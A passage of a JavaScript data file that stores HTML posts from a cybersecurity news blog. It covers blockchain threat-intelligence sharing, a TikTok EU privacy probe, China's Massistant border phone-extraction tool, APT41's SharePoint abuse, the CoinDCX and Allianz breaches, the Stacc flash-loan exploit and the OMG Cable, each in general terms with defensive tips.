          <li>🔐 <strong>Transparency with Privacy:</strong> Blockchain can allow sharing of metadata or anonymized indicators while keeping sensitive internal details hidden.</li>
          <li>⚡ <strong>Real-Time Sharing:</strong> Participants can view new indicators as soon as they’re published on the chain, enabling faster response.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📈 Real-World Success: The Cyber Shield Collective</h4><br>
        <p>In 2024, 50 global banks formed the <strong>Cyber Shield Collective</strong> — a private blockchain-based threat intelligence network. Within six months, they:</p>
        <ul>
          <li>📉 Reduced phishing attacks by 38%.</li>
          <li>🔗 Improved response times to emerging threats by 60%.</li>
          <li>📝 Created a tamper-proof audit trail for regulators and forensic teams.</li>
        </ul>
        <p>This initiative proved that decentralized sharing is not just possible — it’s powerful.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🪙 Beyond Banking: Where Else Can This Help?</h4><br>
        <ul>
          <li>🏥 <strong>Healthcare:</strong> Share indicators of ransomware or medical device vulnerabilities across hospitals.</li>
          <li>🏢 <strong>Critical Infrastructure:</strong> Energy, transportation, and water sectors can collaboratively defend against nation-state actors.</li>
          <li>🎓 <strong>Academia & Research:</strong> Universities and labs can publish findings securely while maintaining attribution.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">💡 How to Get Started</h4><br>
        <ul>
          <li>✅ Evaluate your risk appetite and compliance requirements.</li>
          <li>✅ Join or form a consortium of trusted peers.</li>
          <li>✅ Use permissioned blockchains for sensitive environments.</li>
          <li>✅ Develop APIs & automation to feed intelligence directly into your SOC (Security Operations Center).</li>
          <li>✅ Train staff to understand blockchain concepts and security controls.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">📣 Final Thoughts</h4><br>
        <p>The future of cybersecurity depends on collaboration. Blockchain gives us the tools to collaborate without fear — to share without losing privacy — and to fight back against attackers who already act collectively.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When trust is decentralized, resilience becomes inevitable.”</blockquote>
        <p>We are entering an era where no single entity can defend itself alone. Together, armed with technology and trust, we can close the gap between attacker and defender — one block at a time.</p>
      </section>

      <section style="margin-top:20px;background:#f1f1f1;padding:15px;border-radius:8px;">
        <h4 style="color:#555;">✍️ About the Authors</h4><br>
        <p><strong>Sriniketh Sudheendra</strong> is a BCA student at Christ University focusing on cybersecurity and emerging blockchain technologies.<br>
        <strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic rigor and fresh insight into blockchain’s role in cybersecurity.</p>
      </section>

    </div>
  `},{id:"tiktok-eu-privacy-investigation-2025",title:"📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers",date:"2025-07-20",author:"EthicalByte",summary:"The European Data Protection Board has launched a sweeping investigation into TikTok’s cross-border data practices. The outcome could reshape privacy enforcement and redefine global data flows.",tags:["TikTok","Data Privacy","GDPR","EU Regulations","China Data","Cybersecurity","Cross-Border"],imageKey:"tiktokEUPrivacyBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers</h3><br>
        <p style="font-style:italic;">As data becomes the new currency, Europe is asking: where does yours go?</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🇪🇺 What Happened?</h4><br>
        <p>The **European Data Protection Board (EDPB)** announced a fresh investigation into TikTok’s handling of **cross-border data transfers**, especially those going to China. TikTok, owned by China-based ByteDance, has long been under scrutiny over its privacy practices and potential risks posed to EU citizens’ data sovereignty.</p>
        <p>This move comes on the heels of rising tensions between privacy advocates and global tech firms, many of which store and process data outside the jurisdictions where it was collected.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">📜 Why This Matters</h4><br>
        <ul>
          <li>🔒 <strong>User Trust:</strong> Data privacy is not just a regulatory issue — it’s a trust issue. Users expect platforms to protect their personal information, regardless of where it’s processed.</li>
          <li>🏛️ <strong>Legal Obligations:</strong> GDPR requires clear justification and safeguards for any transfer of EU data outside the bloc.</li>
          <li>🌐 <strong>Geopolitical Tensions:</strong> The scrutiny reflects broader unease over Chinese influence in global tech and concerns of surveillance or misuse of data.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 What Could Happen?</h4><br>
        <ul>
          <li>⚖️ TikTok could face hefty fines if found non-compliant — GDPR allows penalties of up to 4% of annual global turnover.</li>
          <li>🔗 New restrictions might be imposed on how TikTok collects and processes data in Europe.</li>
          <li>🚧 A chilling effect may occur, forcing other companies to re-evaluate their cross-border data strategies.</li>
          <li>📝 Could catalyze stronger data residency laws requiring EU user data to remain within EU servers.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📜 A Pattern of Scrutiny</h4><br>
        <p>This isn’t the first time TikTok has been questioned over its data practices:</p>
        <ul>
          <li>In 2020, India banned TikTok citing privacy and national security concerns.</li>
          <li>In 2022, the US considered similar measures, prompting TikTok to set up “Project Texas” to segregate US data.</li>
          <li>Several EU countries, including Ireland and France, have already opened local probes into TikTok’s compliance with GDPR.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔎 What Should Businesses & Users Do?</h4><br>
        <p>This investigation is a clear signal to businesses and individuals alike:</p>
        <ul>
          <li>✅ Businesses should conduct **data mapping exercises** to identify where data resides and ensure GDPR‑compliant safeguards are in place.</li>
          <li>✅ Adopt **data minimization** — only collect and transfer what is absolutely necessary.</li>
          <li>✅ Users should regularly review privacy policies and limit permissions they grant to apps.</li>
          <li>✅ Governments & regulators may start pushing for **data localization** to safeguard national interests.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Looking Ahead</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a globalized internet, privacy has no borders — but regulations do.”</blockquote>
        <p>This case underscores a broader struggle: how to balance innovation and global access with the need for sovereignty, transparency, and accountability.</p>
        <p>As digital citizens, it is vital to stay informed and demand better practices from the platforms we trust with our data.</p>
      </section>

      

    </div>
  `},{id:"china-massistant-phone-surveillance-2025",title:"📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border",date:"2025-07-21",author:"EthicalByte",summary:"A shocking report reveals that Chinese border police are using a secretive tool, Massistant, to silently extract GPS, messages, and even encrypted chats from visitors’ phones — raising global privacy alarms.",tags:["China","Massistant","Privacy","Surveillance","Border Security","Cybersecurity"],imageKey:"massistantSurveillanceBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border</h3><br>
        <p style="font-style:italic;">If your phone crosses the border, so does your privacy.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>According to a recent <a href="https://thehackernews.com/2025/07/chinas-massistant-tool-secretly.html" target="_blank">investigation</a>, China’s border police have been deploying a covert tool called <strong>Massistant</strong> to extract sensitive data from travelers’ phones during inspections.</p>
        <p>This tool silently installs itself, scrapes the device for GPS history, Signal chats, text messages, contacts, and photos — and then disappears without a trace.</p>
        <p>While currently known to target Android devices, researchers fear that **iPhones could be next**.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Why It Matters</h4><br>
        <ul>
          <li>📍 <strong>Invasive Surveillance:</strong> Users are unaware their data has been harvested.</li>
          <li>🕵️ <strong>Targets Everyone:</strong> Not just suspects — ordinary travelers are exposed.</li>
          <li>🔒 <strong>Signal Compromised:</strong> Even secure messaging apps like Signal may be decrypted if local data is copied.</li>
        </ul>
        <p>Massistant shows just how far state surveillance can reach when physical access to devices is involved.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 How Does It Work?</h4><br>
        <ul>
          <li>⚡ Installs silently while the device is in border agents’ possession.</li>
          <li>📂 Crawls through files, app data, GPS logs, chat histories, and downloads copies.</li>
          <li>🧹 Wipes itself clean from the phone after completing the operation, leaving no evidence behind.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Can You Do?</h4><br>
        <ul>
          <li>✅ Travel with a clean device or “travel phone” with minimal personal data.</li>
          <li>✅ Log out and uninstall sensitive apps before entering high‑risk regions.</li>
          <li>✅ Use full‑device encryption & strong passcodes.</li>
          <li>✅ Avoid unlocking your phone if not legally required to do so.</li>
        </ul>
        <p>Awareness and preparation can significantly reduce the risks to your digital privacy.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In an age where your phone holds your life, crossing a border shouldn’t mean surrendering your privacy.”</blockquote>
        <p>Massistant serves as a wake‑up call about the fragility of privacy when physical device access is involved. It’s crucial to take proactive steps and stay vigilant in an increasingly monitored world.</p>
      </section>

    </div>
  `},{id:"apt41-africa-sharepoint-c2-july-2025",title:"🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2",date:"2025-07-22",author:"EthicalByte",summary:"APT41, a China-backed hacking group, breached African government IT networks by abusing internal SharePoint servers as command‑and‑control infrastructure, using stolen admin credentials, DLL sideloading, and fake GitHub domains.",tags:["APT41","China","Africa","SharePoint","CyberEspionage","ThreatIntel"],imageKey:"apt41AfricaSharePointBanner",content:`
    <div style="background-color:#f5f7fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🕵️ China-linked APT41 Hacks African Governments Using SharePoint as C2</h3><br>
        <p style="font-style:italic;">Even trusted internal servers can become a weapon in the hands of attackers.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>A new investigation has revealed that <strong>APT41</strong> — a Chinese state‑linked advanced persistent threat group — infiltrated African government networks using creative and stealthy techniques.</p>
        <p>Most notably, they abused internal <strong>Microsoft SharePoint servers</strong> as command‑and‑control (C2) nodes to control malware and exfiltrate data while blending into legitimate traffic.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🧰 Tactics & Techniques</h4><br>
        <ul>
          <li>🔑 Stolen administrator credentials for initial access.</li>
          <li>🖇️ <strong>DLL sideloading</strong> — loading malicious code via trusted apps.</li>
          <li>🌐 <strong>Fake GitHub domains</strong> — masking malicious traffic as legitimate developer activity.</li>
          <li>🗃️ Exploiting internal SharePoint servers as covert C2 infrastructure.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🌍 Why Africa?</h4><br>
        <p>This campaign highlights Africa’s growing geopolitical and economic significance. APT41 targeted sensitive policy documents, trade negotiations, and natural resource data — signaling heightened Chinese interest in the region.</p>
        <p>This is one of the few publicly reported APT41 campaigns focused on Africa, showing that no region is safe from cyber‑espionage.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Should Organizations Do?</h4><br>
        <ul>
          <li>✅ Rotate and harden admin credentials; enable MFA.</li>
          <li>✅ Monitor SharePoint servers and internal web traffic for anomalies.</li>
          <li>✅ Block or closely monitor traffic to lookalike GitHub domains.</li>
          <li>✅ Implement whitelisting and restrict DLL execution paths.</li>
          <li>✅ Conduct regular threat hunting exercises based on APT41 TTPs.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When even your internal tools are suspect, vigilance inside the perimeter becomes critical.”</blockquote>
        <p>APT41’s latest activity is a stark reminder that internal platforms like SharePoint are no longer “safe zones.” Organizations must adopt a <strong>zero‑trust mindset</strong> and proactively monitor their networks to stay ahead of sophisticated threats.</p>
      </section>

    </div>
  `},{id:"coindcx-44m-internal-breach-july-2025",title:"🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe",date:"2025-07-23",author:"EthicalByte",summary:"CoinDCX, one of India’s leading crypto exchanges, suffered a $44 million internal breach from an operational account. No customer funds were affected, thanks to their secure cold wallet setup and swift incident response.",tags:["CoinDCX","Crypto Breach","Operational Wallet","Web3 Security","India","Centralized Exchange"],imageKey:"coindcxBreachBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔐 CoinDCX Suffers $44M Internal Fund Breach — Customer Funds Remain Safe</h3><br>
        <p style="font-style:italic;">Proof that even non-customer wallets need bulletproof security.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>CoinDCX confirmed a <strong>sophisticated breach</strong> involving one of its internal operational wallets — not linked to customer holdings — leading to a loss of approximately <strong>$44 million (₹368–378 crore)</strong>. This wallet was specifically used to maintain liquidity across partner exchanges.</p>
        <p>Investigators identified unauthorized transactions routed through obfuscation platforms like <strong>Tornado Cash</strong>, with assets eventually diverted to <strong>Ethereum and Solana wallets</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Discovery & Response Timeline</h4><br>
        <ul>
          <li>🕵️ Blockchain investigators <strong>Cyvers</strong> and <strong>ZachXBT</strong> flagged the anomaly through on-chain behavior monitoring.</li>
          <li>🔐 CoinDCX <strong>immediately isolated</strong> the compromised account, suspended the affected Web3 wallet functionality, and launched a full forensic audit.</li>
          <li>💰 All trading activity, customer withdrawals, and INR deposits remained fully operational during the incident.</li>
          <li>💼 The company announced that <strong>internal reserves</strong> (treasury) will be used to absorb the losses, with <strong>zero impact to users</strong>.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📢 Official Statement Highlights</h4><br>
        <p>CoinDCX reaffirmed its commitment to transparency and security, stating:</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“While this incident impacted a specific operational wallet, all customer assets were and remain completely safe in our cold storage system.”</blockquote>
        <ul>
          <li>✅ Working closely with <strong>CERT-In</strong> and global cybersecurity firms to trace and recover assets.</li>
          <li>✅ Initiated a new <strong>bug bounty program</strong> to crowdsource vulnerabilities from ethical hackers.</li>
          <li>✅ Promised regular updates as the investigation progresses.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d1ecf1;padding:15px;border-radius:8px;">
        <h4 style="color:#0c5460;">📉 Context & Industry Comparison</h4><br>
        <p>This ranks as India’s <strong>second-largest exchange breach</strong>, after the infamous <strong>$235 million WazirX hack</strong> in 2024. Though smaller, the incident raises broader concerns around how internal wallets are managed across centralized exchanges.</p>
        <p>It underscores a growing trend: <strong>customer funds might be safe, but CEX infrastructure remains vulnerable</strong> to gaps in internal privilege control, wallet isolation, and real-time monitoring.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ Key Takeaways</h4><br>
        <ul>
          <li>✅ <strong>Cold wallet separation worked</strong>: Customer assets were never exposed or compromised.</li>
          <li>⚠️ <strong>Hot & operational wallets require layered monitoring and privilege access controls.</strong></li>
          <li>💬 <strong>Communication was swift</strong>, public, and transparent — helping protect the company’s trust score.</li>
          <li>🔧 <strong>Bug bounty initiative</strong> shows CoinDCX is actively learning and adapting post-incident.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌐 Final Reflection</h4><br>
        <p>As centralized exchanges evolve, so do the attack surfaces. Even systems designed for internal liquidity carry major risks when not monitored rigorously. CoinDCX’s breach may serve as a benchmark moment for CEXs worldwide to reassess internal wallet security and develop stricter frameworks for incident detection.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In Web3, your weakest wallet is your loudest breach.”</blockquote>
      </section>

    </div>
  `},{id:"cyber-heist-stacc-attack-july-2025",title:'💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"',date:"2025-07-24",author:"EthicalByte",summary:"A Canadian hacker named “StaccOverflow” (Jarett Dunn) exploited a Solana DeFi app, live-streaming a $1.9M flash loan hack. The event triggered debates on ethics, law, and the evolution of DeFi security.",tags:["DeFi","Flash Loan","Crypto Crime","StaccOverflow","Pump Fun","Solana","Smart Contract Hack"],imageKey:"staccAttackBanner",content:`
    <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e0e0e0;font-family:sans-serif;">

      <div style="text-align:center;margin-bottom:20px;">
        <h2 style="color:#1a1a1a;">💰 Cyber Heist Chronicles: The $1.9 Million "Stacc Attack"</h2>
        <p style="font-style:italic;">A DeFi exploit that blurs the line between ethical hacking and criminality — and it happened in broad digital daylight.</p>
      </div>

      <section>
        <h3 style="color:#e63946;">📉 What Actually Happened?</h3>
        <p>Canadian software developer <strong>Jarett Dunn</strong>, known by the alias <strong>“StaccOverflow”</strong>, carried out a <strong>$1.9 million flash loan exploit</strong> against the Solana-based meme token platform <strong>Pump Fun</strong>. What’s extraordinary is that he <em>live-streamed</em> and <em>tweeted</em> the entire event in real time — all under the claim of “ethical hacking.”</p>
        <ul>
          <li>⚠️ Exploited a smart contract vulnerability involving flash loan logic</li>
          <li>⏱️ Executed the attack in seconds</li>
          <li>🌪️ Obfuscated fund movement via Tornado Cash</li>
          <li>🎙️ Livestreamed and tweeted every step as a “public bug bounty”</li>
          <li>🚓 Arrested within hours in British Columbia</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:16px;border-radius:8px;">
        <h3 style="color:#856404;">⚖️ Ethical Hacking... or Crime?</h3>
        <p>Stacc claimed the exploit was to prove a point — that <strong>Pump Fun</strong> was insecure. He argued it was a “white-hat action,” even referring to the funds as a <em>bounty</em> and saying he was doing the project a favor.</p>
        <p>But authorities didn’t see it that way. His lack of disclosure, immediate financial gain, and use of mixers were all flagged as criminal behavior. He was arrested without bail, pending cybercrime charges.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#2a9d8f;">🛠️ Technical Breakdown</h3>
        <p>Flash loans in DeFi allow users to borrow huge amounts of crypto instantly and repay them within the same transaction. Stacc used this mechanism to manipulate token pricing, buying undervalued tokens and reselling at inflated values — effectively draining liquidity.</p>
        <ul>
          <li>🧠 Vulnerability exploited in Pump Fun’s smart contract pricing model</li>
          <li>🔄 Flash loan loop executed on-chain within seconds</li>
          <li>🧩 Asset laundering via Tornado Cash</li>
          <li>📉 Liquidity pools depleted, price manipulation confirmed</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:16px;border-radius:8px;">
        <h3 style="color:#155724;">🔐 What This Means for DeFi</h3>
        <ul>
          <li>🚨 Flash loans remain a top attack vector for under-secured smart contracts</li>
          <li>📜 Projects must implement and enforce <strong>bug bounty programs</strong> and <strong>disclosure channels</strong></li>
          <li>👥 There’s no legal gray area when millions are stolen — intent does not excuse impact</li>
          <li>🔍 The DeFi ecosystem urgently needs better <strong>on-chain forensics</strong> and exploit alerts</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#264653;">🎙️ Darknet Diaries Feature</h3>
        <p>The entire incident has been covered in <strong>Episode 152</strong> of <a href="https://darknetdiaries.com/episode/152/" target="_blank">Darknet Diaries</a>, breaking down the event, motivations, technology, and arrest. Highly recommended for cybersecurity pros and enthusiasts alike.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:16px;border-radius:8px;">
        <h3 style="color:#1a73e8;">🧠 Final Thoughts</h3>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;margin:10px 0;">
          “In DeFi, it's not just code that gets exploited — it’s trust.”
        </blockquote>
        <p>The “Stacc Attack” is a cautionary tale. Transparency is powerful, but so is accountability. While some may applaud the guts it took to livestream a heist, the law doesn’t — and won’t — applaud intent without consent. Ethical hacking must walk a razor-thin line. Are we ready to redefine what that line even looks like in Web3?</p>
      </section>

    </div>
  `},{id:"usb-cable-hacking-mg-july-2025",title:"🎙️ The USB Cable That Could Hack You: The Story of MG",date:"2025-07-25",author:"Ethicalbyte",summary:"A deep dive into the OMG Cable, a weaponized USB device created by hacker MG, capable of injecting keystrokes, executing remote payloads, and exposing the limits of hardware trust. What looks like a normal cable could be a hacker's backdoor.",tags:["Hardware Hacking","Cybersecurity","OMG Cable","MG","DEF CON","USB Exploits"],imageKey:"usbCableHackingBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🔌 The USB Cable That Could Hack You — The Story of MG</h2>
      <p><i>Published: July 25, 2025 | Author: Cyber Talk Team</i></p>
    </div>

    <section>
      <h3>🧠 Meet MG: Hacker Turned Hardware Security Legend</h3>
      <p>MG is a name that echoes through DEF CON and Black Hat. A brilliant hardware hacker who stunned the cybersecurity world with the creation of the <strong>OMG Cable</strong> — a USB cable that looks normal but behaves like a cyber weapon.</p>
      <p>The cable can connect over Wi-Fi, impersonate a keyboard (HID), and inject commands or malware in seconds — all while remaining invisible to unsuspecting users.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚙️ What Makes the OMG Cable So Dangerous?</h3>
      <ul>
        <li>✅ <strong>Indistinguishable from standard cables</strong></li>
        <li>📶 <strong>Wi-Fi Controlled</strong> — attackers can send commands wirelessly</li>
        <li>🖥️ <strong>Keystroke Injection</strong> — launches attacks within seconds</li>
        <li>🚫 <strong>Stealth Mode</strong> — leaves virtually no trace on the system</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>📽️ Evolution Timeline of the OMG Cable</h3>
      <table style="width:100%;border:1px solid #ccc;text-align:left;border-collapse:collapse;">
        <thead>
          <tr><th style="border:1px solid #ccc;padding:8px;">Year</th><th style="border:1px solid #ccc;padding:8px;">Development</th></tr>
        </thead>
        <tbody>
          <tr><td style="border:1px solid #ccc;padding:8px;">2019</td><td style="border:1px solid #ccc;padding:8px;">First DIY prototype with Arduino internals</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2020</td><td style="border:1px solid #ccc;padding:8px;">DEF CON demo and public awareness</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2022</td><td style="border:1px solid #ccc;padding:8px;">Encrypted Wi-Fi payload support added</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2023</td><td style="border:1px solid #ccc;padding:8px;">Geo-fencing, kill-switch, delayed triggers introduced</td></tr>
          <tr><td style="border:1px solid #ccc;padding:8px;">2025</td><td style="border:1px solid #ccc;padding:8px;">USB-C and cross-platform support released</td></tr>
        </tbody>
      </table>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>💡 Key Takeaways</h3>
      <ul>
        <li>🧠 Even a cable can become a cybersecurity risk</li>
        <li>🚷 Never trust peripherals from unknown sources</li>
        <li>🔐 Implement USB access policies on enterprise devices</li>
        <li>🧰 Red teams are using OMG Cable for realistic simulations</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎧 Want More?</h3>
      <p>MG’s story and tools are discussed in depth in <strong>Darknet Diaries Ep. 154: “The Cable”</strong>. It explores how hardware trust has become a battleground for cybersecurity experts.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🔐 Final Thoughts</h3>
      <blockquote style="border-left:4px solid #28a745;padding-left:10px;">“In cybersecurity, never assume the harmless is harmless.”</blockquote>
      <p>The OMG Cable is a wake-up call: If a USB cable can be a hacker’s gateway, what else can be? From firmware to hardware, vigilance is the new default.</p>
    </section>
  </div>
`},{id:"darknet-diaries-greg-laughing-mantis-ep160-july-2025",title:"🎧 “Greg” (aka Laughing Mantis)",date:"2025-07-27",author:"EthicalByte",summary:"From teenage hacker to InfoSec advocate, Greg Linares—once known as Laughing Mantis—shares his gripping journey through early cybercrime, arrest, and redemption in this must-hear episode of Darknet Diaries.",tags:["Darknet Diaries","Hacker Story","Youth in Cybersecurity","Ethical Hacking","Redemption"],imageKey:"laughingMantisBanner",content:`
  <div style="background:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;margin-bottom:20px">
      <h2>🎧 “Greg” (aka Laughing Mantis)</h2><br>
      <p><i>Published: July 28, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🔍 Who is Greg Linares?</h3><br>
      <p>Known in online circles as <strong>Laughing Mantis</strong>, Greg Linares was once one of the youngest hackers arrested in Arizona. His story unfolds in <em>Darknet Diaries EP 160</em>, where he shares his raw and honest journey—from digital defiance to personal redemption.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>⚡ Rise, Fall, and Rise Again</h3><br>
      <ul>
        <li>🧠 <strong>Early Genius:</strong> Greg started hacking in his early teens, impressing underground forums with his network exploits and manipulation skills.</li>
        <li>🚔 <strong>Reality Check:</strong> A bold mistake led to his arrest as a teenager—forever changing his life trajectory.</li>
        <li>🔁 <strong>Reinvention:</strong> Greg now openly discusses the ethics of hacking and helps educate the next generation on responsible infosec practices.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💡 Lessons from the Life of Laughing Mantis</h3><br>
      <ul>
        <li>⚖️ Talent must be paired with <strong>ethics</strong> and responsibility.</li>
        <li>🧩 One reckless decision can ripple through a lifetime.</li>
        <li>🔄 Redemption is real—growth comes from honest reflection and change.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>🛠️ Actionable Insights</h3><br>
      <ul>
        <li>✅ Support youth mentorships in cybersecurity spaces.</li>
        <li>📚 Encourage ethical coding and digital responsibility education early.</li>
        <li>🎓 Give second chances—today’s rebel could be tomorrow’s innovator.</li>
        <li>🧭 Organizations should identify and engage young cyber talent before legal issues occur.</li>
        <li>🔐 Better collaboration between legal systems and educational institutions can redirect potential into progress.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>🎯 Final Thoughts</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Greg’s story isn’t just about hacking—it’s about humanity, healing, and how the infosec world can be a space for growth.”</blockquote>
      <p>We all make mistakes. Some are bigger than others. But the way we respond, learn, and evolve is what defines us. Greg's journey proves that even the darkest tunnels can lead to brighter outcomes when truth, humility, and guidance are present.</p>
      <p>As the cybersecurity world continues to evolve, it needs more advocates like Greg—individuals who have walked the path, stumbled, and come back stronger. Their voices carry the weight of experience and the wisdom of hindsight.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>🎧 Listen to the Full Story</h3><br>
      <p>Catch the full episode on <strong>Darknet Diaries – Episode 160: “Greg”</strong> to hear firsthand how a teenage hacker turned his life around and now shapes the future of cybersecurity with integrity and purpose.</p>
    </section>
  </div>
`},{id:"allianz-life-insurance-breach-july-2025",title:"🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users",date:"2025-07-28",author:"EthicalByte",summary:"A social engineering attack via a third-party CRM platform compromised the data of 1.4 million Allianz Life customers. The breach illustrates growing risks tied to vendor dependencies, human factors, and evolving attack surfaces in the insurance industry.",tags:["Data Breach","Cybersecurity","Social Engineering","Third-Party Risk","Insurance Security"],imageKey:"allianzBreachBanner",content:`
  <div style="background-color:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;">
      <h2>🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users</h2><br>
      <p><i>Published: July 16, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🧩 What Happened?</h3><br>
      <p>On July 16, 2025, Allianz Life Insurance Company of North America confirmed a significant cybersecurity incident involving the compromise of a third-party CRM vendor. Threat actors used <strong>social engineering tactics</strong> to manipulate support staff, gaining unauthorized access to sensitive client records.</p>
      <p>While <strong>no financial or password data</strong> was breached, personal identifiable information (PII) — including names, emails, policy numbers, and partial SSNs — of nearly <strong>1.4 million U.S. customers</strong> were exposed. Internal employee records were also impacted in limited cases.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>🔑 Key Insights</h3><br>
      <ul>
        <li>🎯 <strong>Social Engineering Vector:</strong> Attackers didn't break in — they were <em>let in</em> through carefully crafted human manipulation.</li>
        <li>🧩 <strong>Third-Party Vulnerability:</strong> The CRM vendor was integrated into Allianz systems, providing an indirect access route.</li>
        <li>📈 <strong>Increasing Trend:</strong> Over 30% of modern data breaches now involve third-party service providers.</li>
        <li>🕵️ <strong>Delayed Detection:</strong> The breach went unnoticed for days until suspicious behavior triggered an internal investigation.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💥 Business Impact</h3><br>
      <ul>
